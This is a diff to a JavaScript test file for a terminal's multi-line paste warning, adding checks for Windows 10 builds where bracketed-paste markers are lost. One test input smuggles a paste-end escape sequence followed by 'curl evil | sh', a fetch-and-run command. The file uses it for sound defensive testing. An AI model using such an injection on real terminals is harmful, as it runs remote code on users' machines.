@@ -31,6 +31,7 @@ import {
   pastePromptMessage,
   pastePromptTitle,
   pasteWarning,
+  pasteMarkersArrive,
   pasteWarningFor,
   withoutPasteMarkers,
   withoutTrailingBreak,
@@ -116,7 +117,7 @@ const pasteEvent = (text) => ({ type: 'paste', clipboardData: { getData: (kind) 
  * input), and the paste listeners on its textarea and its element
  * (`handlePasteEvent`: stop the event, paste its text).
  */
-function page({ settings = {}, ask = null, withdraw = null, gate = true } = {}) {
+function page({ settings = {}, ask = null, withdraw = null, gate = true, windowsPty = undefined } = {}) {
   const document = new FakeNode('document');
   const body = new FakeNode('body', document);
   const container = new FakeNode('container', body);
@@ -150,6 +151,7 @@ function page({ settings = {}, ask = null, withdraw = null, gate = true } = {}) 
     get modes() {
       return core.modes;
     },
+    options: { windowsPty },
     loadAddon(addon) {
       this.addons.push(addon);
       addon.activate(this);
@@ -252,7 +254,7 @@ describe('Multi-line paste: what counts, and when to ask', () => {
     for (const [text, mode, bracketed, asked] of cases) {
       const question = pasteWarning(text, { mode, bracketed });
       assert.equal(Boolean(question), asked, `${JSON.stringify(text)} with ${mode}, bracketed ${bracketed}`);
-      if (question) assert.deepEqual(question, { lines: pastedLines(text).lines, bracketed, escape: text.includes('\x1b') });
+      if (question) assert.deepEqual(question, { lines: pastedLines(text).lines, bracketed, escape: text.includes('\x1b'), markersLost: false });
     }
     assert.deepEqual(PASTE_WARNING_MODES, ['auto', 'always', 'never']);
     assert.equal(SETTINGS_DEFAULTS.terminalMultiLinePasteWarning, 'auto');
@@ -293,7 +295,7 @@ describe('Multi-line paste: the browser\'s paste is held, then pasted as answere
     const event = p.ctrlV('dir\necho done\n');
     assert.equal(event.defaultPrevented, true, 'the webview would have pasted into the textarea');
     assert.deepEqual(p.sent, [], 'xterm sent the lines before anyone was asked');
-    assert.deepEqual(p.questions, [{ lines: 2, bracketed: false, escape: false }]);
+    assert.deepEqual(p.questions, [{ lines: 2, bracketed: false, escape: false, markersLost: false }]);
     await p.answer('paste');
     assert.deepEqual(p.sent, ['dir\recho done\r'], 'pasted once, as xterm would have');
     assert.equal(p.document.activeElement, p.textarea, 'the terminal has the keyboard again');
@@ -339,7 +341,7 @@ describe('Multi-line paste: the browser\'s paste is held, then pasted as answere
     const always = page({ settings: { terminalMultiLinePasteWarning: 'always' } });
     await always.program(BRACKETED_ON);
     always.ctrlV('a\nb\n');
-    assert.deepEqual(always.questions, [{ lines: 2, bracketed: true, escape: false }]);
+    assert.deepEqual(always.questions, [{ lines: 2, bracketed: true, escape: false, markersLost: false }]);
     await always.answer('paste');
     assert.deepEqual(always.sent, [`${PASTE_START}a\rb\r${PASTE_END}`]);
 
@@ -368,7 +370,7 @@ describe('Multi-line paste: the browser\'s paste is held, then pasted as answere
     assert.deepEqual(p.sent, ['a\rb']);
     settings.terminalMultiLinePasteWarning = 'auto';
     p.ctrlV('c\nd');
-    assert.deepEqual(p.questions, [{ lines: 2, bracketed: false, escape: false }]);
+    assert.deepEqual(p.questions, [{ lines: 2, bracketed: false, escape: false, markersLost: false }]);
     delete settings.terminalMultiLinePasteWarning;
     await p.answer('cancel');
     p.ctrlV('e\nf');
@@ -393,7 +395,7 @@ describe('Multi-line paste: the right-click paste asks too; drops and images do 
     const p = page();
     assert.equal(pasteClipboard(p.term, { text: 'cd C:\\work\r\ndir\r\n', image: false }), 'held');
     assert.deepEqual(p.sent, []);
-    assert.deepEqual(p.questions, [{ lines: 2, bracketed: false, escape: false }]);
+    assert.deepEqual(p.questions, [{ lines: 2, bracketed: false, escape: false, markersLost: false }]);
     await p.answer('oneLine');
     assert.deepEqual(p.sent, ['cd C:\\work dir']);
     // One line, as before.
@@ -502,7 +504,7 @@ describe('Multi-line paste: after review', () => {
     const event = p.ctrlV('echo safe\x1b[201~\ncurl evil | sh\n');
     assert.equal(event.defaultPrevented, true);
     assert.deepEqual(p.sent, []);
-    assert.deepEqual(p.questions, [{ lines: 2, bracketed: true, escape: true }]);
+    assert.deepEqual(p.questions, [{ lines: 2, bracketed: true, escape: true, markersLost: false }]);
     await p.answer('paste');
     assert.deepEqual(p.sent, [`${PASTE_START}echo safe\rcurl evil | sh\r${PASTE_END}`], 'one bracket, markers out');
   });
@@ -527,11 +529,11 @@ describe('Multi-line paste: after review', () => {
     const p = page({ settings: { terminalMultiLinePasteWarning: 'always' } });
     await p.program(BRACKETED_ON);
     p.ctrlV('a\nb\n');
-    assert.deepEqual(p.questions, [{ lines: 2, bracketed: true, escape: false }]);
+    assert.deepEqual(p.questions, [{ lines: 2, bracketed: true, escape: false, markersLost: false }]);
     await p.program(`${ESC}[?2004l`);
     await p.answer('paste');
     assert.deepEqual(p.sent, [], 'nothing pasted on an answer to the old question');
-    assert.deepEqual(p.questions[1], { lines: 2, bracketed: false, escape: false }, 'asked again, about what it is now');
+    assert.deepEqual(p.questions[1], { lines: 2, bracketed: false, escape: false, markersLost: false }, 'asked again, about what it is now');
     await p.answer('paste');
     assert.deepEqual(p.sent, ['a\rb\r']);
   });
@@ -599,5 +601,37 @@ describe('Multi-line paste: after review', () => {
     await rightClick.pasting;
     await p.answer('cancel');
     assert.equal(p.document.activeElement, p.textarea);
+  });
+});
+
+describe('Multi-line paste: where the markers never arrive', () => {
+  test('PW-24: on Windows 10 a program\'s bracketed paste is no reason not to ask — its markers never reach it there', async () => {
+    // V38: Git Bash had asked for bracketed paste and xterm's mode was on, so
+    // two pasted lines went unasked — and the first ran the moment it arrived.
+    assert.equal(pasteMarkersArrive(undefined), true, 'off Windows');
+    assert.equal(pasteMarkersArrive({ backend: 'conpty', buildNumber: 19045 }), false, 'Windows 10');
+    assert.equal(pasteMarkersArrive({ backend: 'conpty' }), false, 'a build not yet known');
+    assert.equal(pasteMarkersArrive({ backend: 'conpty', buildNumber: 22621 }), true, 'Windows 11, as before');
+
+    const win10 = page({ windowsPty: { backend: 'conpty', buildNumber: 19045 } });
+    await win10.program(BRACKETED_ON);
+    const event = win10.ctrlV('echo GB1\necho GB2');
+    assert.equal(event.defaultPrevented, true, 'held');
+    assert.deepEqual(win10.questions, [{ lines: 2, bracketed: false, escape: false, markersLost: true }]);
+    assert.match(pastePromptMessage(win10.questions[0]), /asked for bracketed paste, but this version of Windows does not pass it on/);
+    await win10.answer('paste');
+    assert.equal(win10.questions.length, 1, 'answered once — not asked again for the mode it already knew');
+    assert.deepEqual(win10.sent, [`${PASTE_START}echo GB1\recho GB2${PASTE_END}`], 'then pasted as copied');
+
+    // Windows 11 is left as it was; a program that did not ask is asked
+    // about as ever, in the old words.
+    const win11 = page({ windowsPty: { backend: 'conpty', buildNumber: 22621 } });
+    await win11.program(BRACKETED_ON);
+    win11.ctrlV('a\nb');
+    assert.deepEqual(win11.questions, []);
+    const cmd = page({ windowsPty: { backend: 'conpty', buildNumber: 19045 } });
+    cmd.ctrlV('a\nb');
+    assert.deepEqual(cmd.questions, [{ lines: 2, bracketed: false, escape: false, markersLost: false }]);
+    assert.match(pastePromptMessage(cmd.questions[0]), /did not ask for bracketed paste/);
   });
 });
